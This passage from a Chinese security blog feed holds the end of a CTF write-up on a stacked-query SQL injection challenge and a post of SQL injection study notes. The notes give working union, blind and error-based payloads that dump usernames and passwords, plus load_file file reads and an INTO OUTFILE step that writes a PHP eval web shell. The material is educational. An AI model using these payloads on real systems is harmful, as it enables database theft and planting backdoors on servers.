class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;  <span class="keyword">alter</span> <span class="keyword">table</span>s words rename <span class="keyword">to</span> words1; #</span><br><span class="line">;  <span class="keyword">alter</span> <span class="keyword">table</span>s `<span class="number">1919810931114514</span>` rename <span class="keyword">to</span> words ;#</span><br></pre></td></tr></table></figure><p>这样就把我们的1919810931114514的表明改为了word，由于系统默认查询的是words，因此此时只需要：</p><p><code>1&#39; or 1=1 #</code>:</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415172800938.png" alt="image-20220415172800938"></p><p>结果发现出了点小问题，怎么回事？原来是因为默认查找的words表中必须有id字段，那我们再加一条：</p><p><code>;  alter tables words change flag id varchar(50); #</code></p><p>但是这里已经闭合不上了，重新起一遍环境：</p><p>直接三句话合成一句一波搞定：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</span></span><br></pre></td></tr></table></figure><p>改完查一查到底改了没：</p><p><strong>1’;show tables;</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415173248799.png" alt="image-20220415173248799"></p><p>可以的，我们此时就可以直接查询原1919810931114514的所有项了：<strong>1’ or 1=1;#</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415173332616.png" alt="image-20220415173332616"></p><p>好，搞定了，因为懒得改回去，所以我们重新再起一遍环境，开启下一种解法。</p><h3 id="二、预编译法"><a href="#二、预编译法" class="headerlink" title="二、预编译法"></a>二、预编译法</h3><p>参考：<a href="https://www.cnblogs.com/micrari/p/7112781.html">https://www.cnblogs.com/micrari/p/7112781.html</a></p><blockquote><p>通常我们的一条sql在db接收到最终执行完毕返回可以分为下面三个过程：</p><ol><li>词法和语义解析</li><li>优化sql语句，制定执行计划</li><li>执行并返回结果</li></ol><p>我们把这种普通语句称作<strong>Immediate Statements</strong>。</p><p>但是很多情况，我们的一条sql语句可能会反复执行，或者每次执行的时候只有个别的值不同（比如query的where子句值不同，update的set子句值不同,insert的values值不同）。<br>如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。</p><p>所谓预编译语句就是将这类语句中的值用占位符替代，可以视为将sql语句模板化或者说参数化，一般称这类语句叫<strong>Prepared Statements</strong>或者<strong>Parameterized Statements</strong><br>预编译语句的优势在于归纳为：<strong>一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止sql注入。</strong><br>当然就优化来说，很多时候最优的执行计划不是光靠知道sql语句的模板就能决定了，往往就是需要通过具体值来预估出成本代价。</p></blockquote><p>首先呢，我们用sql定义一个字符串变量，在其中使用concat绕过内容限制；<br>然后使用<code>set</code>命令对这个变量中的内容进行预编译<br>最后使用<code>excute</code>命令直接执行该语句；</p><p><strong>编译</strong></p><p>set @sql = concat(‘sele’,’ct * from `1919810931114514`;’);</p><p>prepare stm from @sql;</p><p><strong>执行</strong></p><p>execute stm;–+</p><p><strong>最终构造语句：</strong></p><p>set @sql = concat(‘sele’,’ct * from <code>1919810931114514</code>;’);prepare stm from @sql;execute stm;#</p><p>执行以下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415175526561.png" alt="image-20220415175526561"></p><p>发现竟然不行。。。仔细观察返回内容，可以看到使用限制的函数是strstr，有点搞笑，直接大写绕过：</p><p><strong>1’;sEt @sql = concat(‘sele’,’ct * from <code>1919810931114514</code>;’);prEpare smt from @sql;execute smt;#</strong></p><p>成功了！</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415180112959.png" alt="image-20220415180112959"></p><p>strstr的使用比较愚蠢，如果使用对于大小写不敏感的*strstrw()*，或许会更难使用这种方法吧~</p><h3 id="三、使用handler执行"><a href="#三、使用handler执行" class="headerlink" title="三、使用handler执行"></a>三、使用handler执行</h3><p>handler介绍参考：<a href="https://blog.csdn.net/qq_43427482/article/details/109898934">https://blog.csdn.net/qq_43427482/article/details/109898934</a></p><p>注入教程参考：<a href="https://blog.csdn.net/nicesa/article/details/106390405">https://blog.csdn.net/nicesa/article/details/106390405</a></p><blockquote><p>MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。</p></blockquote><p>使用方法：</p><p>handler table_name open打开一张表<br>handel table_name read first读取第一行内容，<br>handel table_name read next依次获取其它行<br>最后一行执行之后再执行handel table_name read next会返回一个空的结果</p><p><strong>1’;handler `1919810931114514` open;handler `1919810931114514` read first;#</strong></p><p>直接使用这句话：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220415181115643.png" alt="image-20220415181115643"></p><p>牛，确实还是这个最快，改名字属实是奇葩思路。。.</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入笔记@Biscuit19</title>
      <link href="/2022/04/14/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/04/14/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入笔记"><a href="#sql注入笔记" class="headerlink" title="sql注入笔记"></a>sql注入笔记</h1><p>​    被迫转web了，总结一下sql注入吧，笔记源于@**Biscuit19_**；</p><h2 id="0x01-sql基础"><a href="#0x01-sql基础" class="headerlink" title="0x01 sql基础"></a>0x01 sql基础</h2><h3 id="一、插入更新删除"><a href="#一、插入更新删除" class="headerlink" title="一、插入更新删除"></a>一、插入更新删除</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (column_name column_type);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_name (column1,column2,column3,...) <span class="keyword">values</span> (value1,value2,value3,...);</span><br><span class="line"></span><br><span class="line">update tb_name <span class="keyword">set</span> 字段<span class="number">1</span> <span class="operator">=</span> 新值,字段<span class="number">2</span> <span class="operator">=</span> 新值,  <span class="keyword">where</span> 字段 <span class="operator">=</span> 某值；</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> tb_name <span class="keyword">where</span> 列名称 <span class="operator">=</span> 某值；</span><br></pre></td></tr></table></figure><h3 id="二、常用到的通用字段"><a href="#二、常用到的通用字段" class="headerlink" title="二、常用到的通用字段"></a>二、常用到的通用字段</h3><p><strong>information_schema</strong>是整个数据库</p><p>information_schema里的表：</p><ul><li><strong>information_schema.schemata</strong>为所有数据库信息，包含：<ul><li>其中的字段：</li><li><strong>schema_name</strong>: 所有数据库名</li></ul></li><li><strong>information_schema.tables</strong>为所有表的信息，包含：<ul><li>其中的字段：</li><li><strong>table_schema</strong>: 表所在的数据库名</li><li><strong>table_rows</strong>表的行数（有多少条数据）</li><li><strong>table_name</strong> 记录数据表名</li></ul></li><li><strong>information_schema.columns</strong>为所有字段的信息，包含：<ul><li>其中的字段： </li><li><strong>column_name</strong>字段名</li><li><strong>table_name</strong>   字段所在的表名（用于条件查询）</li><li><strong>table_schema</strong> 字段所在数据库名（用于条件查询）</li><li><strong>column_type</strong> 字段类型</li></ul></li></ul><h3 id="三、常用语法："><a href="#三、常用语法：" class="headerlink" title="三、常用语法："></a>三、常用语法：</h3><h4 id="1-基础"><a href="#1-基础" class="headerlink" title="1.基础"></a>1.基础</h4><p>在最基础的查询语句中，我们直接使用如下语法进行查询，并使用where作为条件限制：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> field1,field2,...fieldn... <span class="keyword">from</span> 表名 [<span class="keyword">where</span> 条件];</span><br></pre></td></tr></table></figure><h4 id="2-Order-by"><a href="#2-Order-by" class="headerlink" title="2.Order by"></a>2.Order by</h4><h5 id="order-by-字段名（列名"><a href="#order-by-字段名（列名" class="headerlink" title="order by 字段名（列名"></a>order by 字段名（列名</h5><p>进一步的，我们为了更好的排序输出结果，可以用orderby来控制结果的排序（asc为顺序，desc为逆序）：</p><p>select * from 表名 [where 条件] [ order by  field1 [desc/asc],field2 [desc/asc]… ];</p><p>举个例子：</p><p>​    以逆字母顺序显示公司名称，并以数字顺序显示顺序号：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Company, OrderNumber <span class="keyword">FROM</span> Orders <span class="keyword">ORDER</span> <span class="keyword">BY</span> Company <span class="keyword">DESC</span>, OrderNumber <span class="keyword">ASC</span></span><br></pre></td></tr></table></figure><h5 id="order-by-数字"><a href="#order-by-数字" class="headerlink" title="order by 数字"></a>order by 数字</h5><p>含义：order by+列名 就是按某一列的排序进行查找,默认升序, 加数字就是第几列的意思，如下</p><p>sql语句中order by 1或者order by 2…order by N</p><p>其实1表示第一个字段,2表示第二个字段; </p><p>依此类推,当表中只有2个栏位时,order by 3就会出错, 所以就说明列表只有2个字段, 是用来报字段名的</p><h4 id="3-limit"><a href="#3-limit" class="headerlink" title="3.limit"></a>3.limit</h4><p>**!!!从0开始!!! **</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">table</span> LIMIT [<span class="keyword">offset</span>,] <span class="keyword">rows</span> <span class="operator">|</span> <span class="keyword">rows</span> <span class="keyword">OFFSET</span> <span class="keyword">offset</span></span><br></pre></td></tr></table></figure><p>第一个参数指定从第几行开始查，第二个参数指定要查几行。<strong>初始记录行的偏移量是 0(而不是 1)</strong></p><p>举个例子：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> \<span class="operator">*</span> <span class="keyword">FROM</span> table1 LIMIT <span class="number">5</span>,<span class="number">10</span>; # 检索记录行 <span class="number">6</span><span class="number">-15</span>\<span class="operator">*</span></span><br><span class="line"><span class="keyword">SELECT</span> \<span class="operator">*</span> <span class="keyword">FROM</span> table1 LIMIT <span class="number">5</span>; #检索前 <span class="number">5</span> 个记录行\<span class="operator">*</span>（<span class="number">0</span><span class="number">-4</span>）</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table1 limit n<span class="number">-1</span>,<span class="number">1</span>; #查询第n行</span><br><span class="line"><span class="keyword">SELECT</span> \<span class="operator">*</span> <span class="keyword">FROM</span> table1 LIMIT <span class="number">95</span>,<span class="number">-1</span>; #检索记录行 <span class="number">96</span><span class="operator">-</span>last.\<span class="operator">*</span></span><br></pre></td></tr></table></figure><h4 id="4-UNION-联合查询"><a href="#4-UNION-联合查询" class="headerlink" title="4.UNION(联合查询)"></a>4.UNION(联合查询)</h4><ul><li>UNION必须由两条或两条以上的SELECT语句组成，语句之间用关键字UNION分隔</li><li>UNION中的每个查询必须包含相同的列，然后会将这两个结果通过这个相同的列链接起来。</li><li>UNION会从查询结果集中自动去除了重复行，UNION ALL不会。</li></ul><h4 id="5-concat-ws-函数"><a href="#5-concat-ws-函数" class="headerlink" title="5.concat_ws()函数"></a>5.concat_ws()函数</h4><p>简单的说，就是一个字符串连接函数：</p><ol><li><p>功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符;（concat_ws就是concat with separator）</p></li><li><p>语法：concat_ws(separator, str1, str2, …)</p></li></ol><p>举个例子</p><p>SELECT CONCAT_WS(‘,’,’First name’,NULL,’Last Name’);返回结果为<br>+———————————————-+<br>| CONCAT_WS(‘,’,’First name’,NULL,’Last Name’) |<br>+———————————————-+<br>| First name,Last Name             |#可以看到通过逗号分隔了<br>+———————————————-+e</p><p>**concat()**和它一样，只不过是少了分隔符，就是单纯的多个字符串连接成一个字符串</p><h4 id="6-group-concat（-concat-ws）"><a href="#6-group-concat（-concat-ws）" class="headerlink" title="6.group_concat（+concat_ws）"></a>6.group_concat（+concat_ws）</h4><ol><li><p>功能：把查询到的很多行合成一行来写</p></li><li><p>语法：group_concat( [distinct] str1,str2… [order by 排序字段 asc/desc ] [separator ‘分隔符’] ):</p></li></ol><p>默认就是以 ，为分隔符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> (GROUP_CONCAT(mk_username,mk_password)) <span class="keyword">FROM</span> demouser.mk_users </span><br><span class="line">得到:</span><br><span class="line">test5111111,test6111111,test7111111</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> (GROUP_CONCAT(concat_ws(<span class="string">&#x27;,&#x27;</span>,mk_username,mk_password))) <span class="keyword">FROM</span> demouser.mk_users </span><br><span class="line">得到：</span><br><span class="line">test5,<span class="number">111111</span>,test6,<span class="number">111111</span>,<span class="number">11111</span>,<span class="number">1111111111</span>,test7,<span class="number">1111111</span></span><br></pre></td></tr></table></figure><h2 id="0x02-常用语句"><a href="#0x02-常用语句" class="headerlink" title="0x02 常用语句"></a>0x02 常用语句</h2><h3 id="一、爆数据库信息常用语句"><a href="#一、爆数据库信息常用语句" class="headerlink" title="一、爆数据库信息常用语句"></a>一、爆数据库信息常用语句</h3><h4 id="1-用户数据库版本，管理员用户名及数据库名字"><a href="#1-用户数据库版本，管理员用户名及数据库名字" class="headerlink" title="1.用户数据库版本，管理员用户名及数据库名字"></a>1.用户数据库版本，管理员用户名及数据库名字</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> version(),<span class="keyword">user</span>(),<span class="number">5</span>,database()</span><br></pre></td></tr></table></figure><h4 id="2-爆所有数据库名："><a href="#2-爆所有数据库名：" class="headerlink" title="2.爆所有数据库名："></a>2.爆所有数据库名：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(SCHEMA_NAME) <span class="keyword">from</span> information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><h4 id="3-爆某数据库中的所有表名："><a href="#3-爆某数据库中的所有表名：" class="headerlink" title="3.爆某数据库中的所有表名："></a>3.爆某数据库中的所有表名：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>  <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;数据库名&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。</strong><br>类似TABLE_SCHEMA=0x674657374</p><h4 id="4-爆某数据库中某表的所有字段名："><a href="#4-爆某数据库中某表的所有字段名：" class="headerlink" title="4.爆某数据库中某表的所有字段名："></a>4.爆某数据库中某表的所有字段名：</h4><p>select group_concat(COLUMN_NAME) from information_schema.COLUMNS where<br>TABLE_SCHEMA=’数据库名’and TABLE_NAME=’表名’</p><h4 id="5-爆某表中的所有信息，用逗号分隔"><a href="#5-爆某表中的所有信息，用逗号分隔" class="headerlink" title="5.爆某表中的所有信息，用逗号分隔"></a>5.爆某表中的所有信息，用逗号分隔</h4><p>select GROUP_CONCAT(concat_ws(‘,’,st1,st2…)) FROM 数据库名.表名</p><p>、</p><h2 id="0x03-常见注入类型"><a href="#0x03-常见注入类型" class="headerlink" title="0x03 常见注入类型"></a>0x03 常见注入类型</h2><h3 id="一、字符型注入-判断引号闭合"><a href="#一、字符型注入-判断引号闭合" class="headerlink" title="一、字符型注入,判断引号闭合:"></a>一、字符型注入,判断引号闭合:</h3><p>‘ or ‘1’=’1</p><p>“ or “1”=”1</p><p>原理:</p><p><strong>select * from mk_users where mk_username=’Biscuit19_’ and mk_password=’’ or ‘1’=’1’</strong></p><h3 id="二、注释型注入"><a href="#二、注释型注入" class="headerlink" title="二、注释型注入"></a>二、注释型注入</h3><p>‘or 1=1 #</p><p><strong>select * from mk_users where mk_username=’Biscuit19_’ and mk_password=’’ or 1=1 #’</strong></p><p>Biscuit19_’ or 1=1 #</p><p><strong>select * from mk_users where mk_username=’Biscuit19_’ or 1=1 #’ and mk_password=’123334’</strong></p><p><strong>没有显示位</strong></p><h3 id="三、union注入"><a href="#三、union注入" class="headerlink" title="三、union注入"></a>三、union注入</h3><p>{“userName”:”Biscuit19_”,”userType”:”USER”,”filePath”:””}</p><p>{“userName”:”Biscuit19_’ union select 1,2,3,4 #”,”userType”:”USER”,”filePath”:””}</p><p> <strong>用来合并两个或多个 SELECT 语句的结果集</strong></p><p>select <strong>dir_name</strong> as FileName,<strong>dir_type</strong> as FileType,<strong>update_time</strong> as<br>    RecentEditTime,<strong>creator_name</strong> as Creater from file_dir where creator_name=’Biscuit19_’ <strong>union select 1,2,3,4</strong> #’</p><p>多了一个元组</p><p>{“userName”:”Biscuit19_’ union select database(),user(),version(),4 #”,”userType”:”USER”,”filePath”:””}</p><p>{“userName”:”Biscuit19_’ union select (select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),user(),version(),4 #”,”userType”:”USER”,”filePath”:””}</p><p>{“userName”:”Biscuit19_’ union select (select  group_concat(table_name) from information_schema.tables where table_schema=’数据库名’),user(),version(),4 #”,”userType”:”USER”,”filePath”:””}</p><p>{“userName”:”Biscuit19_’ union select (select  group_concat(table_name) from information_schema.tables where table_schema=’demouser’),user(),version(),4 #”,”userType”:”USER”,”filePath”:””}</p><p>{“userName”:”Biscuit19_’ union select (select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=’demouser’and TABLE_NAME=’mk_users’),user(),version(),4 #”,”userType”:”USER”,”filePath”:””}</p><p>{“userName”:”Biscuit19_’ union select (select GROUP_CONCAT(concat_ws(‘,’,mk_id,mk_username,mk_password,mk_email,mk_enabled,create_time,update_time)) FROM demouser.mk_users),user(),version(),4 #”,”userType”:”USER”,”filePath”:””}</p><h3 id="四、布尔盲注"><a href="#四、布尔盲注" class="headerlink" title="四、布尔盲注"></a>四、布尔盲注</h3><p>页面在执行sql语句后，只会显示两种结果，这时可通过构造逻辑表达式的sql语句来判断数据的具体内容。</p><p>注意：布尔盲注是逻辑运算而不是输出值，所以and后面接的是逻辑表达式；还有，必须select出来结果才能比较</p><p>1=1 是没有结果的</p><p>SELECT 1=1 才有结果，结果是1（true），这里指的是函数（）需要select 出来比较，而不是说1=1就没有结果，1=1的结果就是true，这句话的意思就是这种函数得到的值要select出来才可以</p><p>(select length(database())=3)</p><h4 id="1-所用函数"><a href="#1-所用函数" class="headerlink" title="1.所用函数"></a>1.所用函数</h4><h5 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h5><p>函数可返回字符串的长度，用于碰撞出数据库名字的长度。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">length</span>(<span class="params">database(</span>))</span>;</span><br></pre></td></tr></table></figure><h5 id="substring"><a href="#substring" class="headerlink" title="substring()"></a>substring()</h5><p>substring()函数可以截取字符串，可指定开始的位置和截取的长度，用于进一步剪切。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">substring</span>(<span class="params"><span class="string">&#x27;test&#x27;</span>,<span class="number">1</span>,<span class="number">3</span></span>)</span>;</span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">substring</span>(<span class="params"><span class="string">&#x27;test&#x27;</span>,<span class="number">2</span>,<span class="number">1</span></span>)</span>;</span><br></pre></td></tr></table></figure><p>substring的第一位是1，不是0，所以至少从1开始</p><h5 id="ord"><a href="#ord" class="headerlink" title="ord()"></a>ord()</h5><p>ord()函数可以返回单个字符的ASCII码</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">substring</span>(<span class="params">database(</span>),1,1)</span>;</span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">ord</span>(<span class="params">substring(database(</span>),1,1))</span>;</span><br></pre></td></tr></table></figure><p>因此，通过(select ord(substring(database(),1,1))=31)这样的语句反复碰撞，就能得到数据库名！</p><p>即只需要和这些字符的ASCII值进行比较：</p><p>0-9：48-57          _：95<br>A-Z：65-91         a-z：97-122</p><p>全查：33-126</p><h4 id="2-手工注入"><a href="#2-手工注入" class="headerlink" title="2 手工注入"></a>2 手工注入</h4><h5 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>因为<strong>sql执行失败和未查到数据都会返回False</strong>，所以只能通过返回的逻辑值来判断，如果有类似如下这种情况，则存在布尔盲注</p><p>也可以通过sleep(3)来试试，看看会不会停止3s，如果停止了，说明后面的语句也执行了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 整型注入 */</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>bool.php?name<span class="operator">=</span>user1 <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="literal">true</span> </span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>bool.php?name<span class="operator">=</span>user1 <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> flase</span><br><span class="line"><span class="comment">/* 字符型注入 */</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>bool.php?name<span class="operator">=</span>user1<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>bool.php?name<span class="operator">=</span>user1<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span></span><br><span class="line"><span class="comment">/* 字符型注入 */</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>bool.php?name<span class="operator">=</span>user1&quot; and &quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>bool.php?name<span class="operator">=</span>user1&quot; and &quot;<span class="number">1</span>&quot;=&quot;<span class="number">2</span></span><br></pre></td></tr></table></figure><p>注意！当你连一个正确的参数都没有的时候，你要直接闭合然后把and改成or来判断，此时前一个条件为false，用or后面来决定对错，where username=’’ or 1=1 /1=2 如:</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user_name=<span class="string">&#x27; or 1=1 # </span></span><br><span class="line"><span class="string">user_name=&#x27;</span> or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1 </span></span><br></pre></td></tr></table></figure><h3 id="五、时间盲注"><a href="#五、时间盲注" class="headerlink" title="五、时间盲注"></a>五、时间盲注</h3><p>基本上和布尔盲注是一样的。</p><p>{“username”:”Biscuit19_’ and if(1=1,sleep(3),1) #”,”password”:” “}</p><p><strong>select * from mk_users where mk_username=’Biscuit19_’ and if(1=1,sleep(1),1) #’ and mk_password=’ ‘</strong></p><h3 id="六、报错注入"><a href="#六、报错注入" class="headerlink" title="六、报错注入"></a>六、报错注入</h3><h4 id="ExtractValue-报错注入"><a href="#ExtractValue-报错注入" class="headerlink" title="ExtractValue()报错注入"></a>ExtractValue()报错注入</h4><p>extractvalue()：从目标XML中返回包含所查询值的字符串。<br>　　EXTRACTVALUE (XML_document, XPath_string);<br>　　第一个参数：XML_document是String格式，为XML文档对象的名称<br>　　第二个参数：XPath_string (Xpath格式的字符串)</p><p>需要注意，extractvalue()能查询字符串的最大长度为32，</p><p><strong>报错原理</strong></p><p>例如</p><p><code>SELECT ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#39;, &#39;/a/b&#39;);</code> 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。</p><p>​    也就是说，我们在第二个参数里输出的错误信息会原封不动的报错报出来，所以我们就通过这个来执行注入（当显示位）。</p><p><strong>约束条件</strong><br>输出字符长度限制为32个字符，可以用MID函数等操作</p><p><strong>注入语句</strong><br>and extractvalue(null,concat(0x7e,(代码操作),0x7e))</p><p>（这里的0x7e是 ~ 波浪号，只是为了好看）</p><p><strong>举例</strong><br>select * from users where id and extractvalue(null,concat(0x7e,(select version()),0x7e));</p><h5 id="MID函数"><a href="#MID函数" class="headerlink" title="MID函数"></a>MID函数</h5><blockquote><p><code>MID()</code>函数用于从文本字段中提取字符。 SELECT MID(column_name,start[,length]) FROM table_name;</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid((select flag from flag),1,16)//从1开始截16个，即1-16</span><br></pre></td></tr></table></figure><h4 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml()报错注入"></a>updatexml()报错注入</h4><p>updatexml()函数与extractvalue()同理，第二个参数会被原封不动输出。</p><p>语法updatexml(目标xml文档，xml路径，更新的内容)</p><p>注入：</p><p>and (updatexml(‘1’,concat(0x7e,(代码操作),0x7e),’1’))</p><h3 id="七、读写文件"><a href="#七、读写文件" class="headerlink" title="七、读写文件"></a>七、读写文件</h3><h4 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h4><h5 id="1-使用条件"><a href="#1-使用条件" class="headerlink" title="1.使用条件"></a>1.使用条件</h5><ol><li>有读取文件的权限 <strong>r</strong></li></ol><p><code>and (select count(*) from mysql.user)&gt;0</code><br>如果返回正常则说明有权限，反之没有</p><ol start="2"><li><p>文件大小不能超过<strong>max_allowed_packet</strong></p></li><li><p><strong>secure_file_priv</strong>的值不为NULL</p></li></ol><h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p><strong>必须指定完整路径的文件</strong>，而且必须有FILE权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select LOAD_FILE(&#x27;D:/1.txt&#x27;) </span><br><span class="line">select LOAD_FILE(&#x27;/var/www/html/ma.php&#x27;) </span><br><span class="line">select LOAD_FILE(&#x27;/flag&#x27;) </span><br></pre></td></tr></table></figure><p>输出文件内容，括号里必须是绝对路径</p><p>同样的，它也可以使用substring：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUBSTRING(LOAD_FILE(&#x27;D:/1.txt&#x27;),5,1)</span><br></pre></td></tr></table></figure><h4 id="outfile（）"><a href="#outfile（）" class="headerlink" title="outfile（）"></a>outfile（）</h4><p>写文件的,就是把select出来的所有东西都写进这个路径的文件中</p><p>1.当对于单引号过滤的时候，就完犊子了，因为绝对路径必须有单引号，十六进制和ASCII都不行</p><p>2.outfile经典一句话<br><code>select &#39;&lt;?php eval($_POST[cmd])?&gt;&#39; into outfile &#39;d：/muma.php&#39;</code></p><p>注意路径符号：错误“\” 正确”\“ 正确”/“。如果将路径转换为16进制就可以不用引号。</p><p>3.必须要有可写的权限。<strong>w</strong></p><p>4.如果单引号过滤，能找到phpmyadmin也行</p><p>5.linux真的是权限不行，必须给相关的目录包括父目录用户o开启W权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> (<span class="string">&#x27;&lt;?php  @eval($_POST[&quot;hack&quot;])?&gt;&#x27;</span>) <span class="keyword">into</span> outfile&quot;/var/www/html/ma.php&quot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> (<span class="string">&#x27;&lt;?php  @eval($_REQUEST[&quot;hack&quot;])?&gt;&#x27;</span>) <span class="keyword">into</span> outfile &quot;D:/1.txt&quot;</span><br></pre></td></tr></table></figure><h2 id="如何去判断SQL注入漏洞"><a href="#如何去判断SQL注入漏洞" class="headerlink" title="如何去判断SQL注入漏洞"></a>如何去判断SQL注入漏洞</h2><ul><li>and 1=1 / and 1=2 回显页面不同（整形判断）</li><li>单引号判断 ‘ 显示数据库错误信息或者页面回显不同（整形，字符串类型判断）</li><li>\ (转义符)</li><li>-1/+1 